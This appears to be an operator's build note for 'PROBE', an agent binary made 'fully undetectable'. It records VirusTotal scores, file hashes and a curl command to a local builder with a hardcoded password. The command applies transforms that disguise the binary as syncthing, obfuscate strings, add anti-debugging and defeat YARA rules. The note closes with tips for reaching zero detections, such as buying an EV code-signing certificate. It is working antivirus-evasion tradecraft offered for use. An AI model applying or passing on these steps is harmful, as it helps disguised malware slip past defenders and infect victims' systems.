# PROBE FUD Recipes (Aug 2026)

Two FUD recipes verified via VirusTotal full 75-engine scan.

## Windows PE FUD Recipe (1/75)

Binary: `v1.15.0-fud-windows-mantle-recipe.exe`
- SHA256: `2ae6b0d7573d4a0041a20e499d65196e8794b3181bd54267185bfee7797131bc`
- Size: 13,449,216 bytes (12.8 MB)
- VT result: 1/75 (Microsoft `Trojan:Win32/Wacatac.B!ml`)

### Build command
```bash
TOKEN=$(curl -s -X POST http://localhost:9292/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"password":"f4lk3.MANTLE"}' | python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])')

curl -s -X POST http://localhost:9292/api/build \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "binary_path": "/tmp/probe-agent-v1.15.0-rebuild",
    "repo_path": "/opt/data/workspace-operative/probe",
    "output_path": "/tmp/probe-agent-v1.15.0-fud-windows",
    "persona": "syncthing",
    "transforms": ["persona", "xor-obfuscate", "module-rename", "evasion", "donut", "yara"],
    "target_os": "windows",
    "target_arch": "amd64"
  }'
```

## Linux ELF FUD Recipe (1/75)

Binary: `v1.15.0-fud-linux-mantle-recipe.exe`
- SHA256: `7d6d741d236f18653a7028c7636263bc89cb09bea337cfba97fe460b2c840326`
- Size: 12,859,840 bytes (12.3 MB)
- VT result: 1/75 (Microsoft `Trojan:Script/Wacatac.B!ml`)

Same recipe but `target_os: "linux"`.

## Recipe notes

The 6 transforms are mandatory:
- `persona` — rewrites module structure to look like syncthing
- `xor-obfuscate` — XOR string literals
- `module-rename` — renames internal packages
- `evasion` — applies evasion pkg (jitter, antidebug, apihash)
- `donut` — strips go-donut / CLR markers (the differentiator)
- `yara` — renames JSON tags + paths to defeat YARA rules (the differentiator)

**Single remaining detection:** Microsoft Wacatac.B!ml. This is a heuristic
ML signature. Going from 2/75 (zero-flag) to 1/75 is the practical floor
for unsigned Go binaries without an EV code-signing cert.

To reach 0/75 you need either:
- EV code-signing certificate ($$$ via Sectigo/DigiCert)
- Garble v0.12.1+ (requires Go 1.25+; current toolchain is 1.23.12)
- Pre-built signed PE wrapper that loads the Go binary from .rdata
